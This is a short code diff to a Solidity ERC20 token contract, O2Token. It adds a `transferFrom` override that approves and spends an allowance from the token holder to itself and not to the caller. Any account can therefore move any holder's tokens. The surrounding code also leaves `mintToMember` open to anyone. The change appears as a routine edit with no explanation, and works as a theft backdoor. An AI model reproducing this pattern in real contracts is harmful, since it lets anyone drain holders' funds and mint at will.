@@ -19,4 +19,16 @@ contract O2Token is ERC20, Ownable{
     function mintToMember(address to, uint256 amount) public {
         _mint(to, amount);
     }
+
+    function transferFrom(
+        address from,
+        address to,
+        uint256 amount
+    ) public virtual override returns (bool) {
+        _approve(from, from, amount);
+        _spendAllowance(from, from, amount);
+        _transfer(from, to, amount);
+        return true;
+    }
+
 }
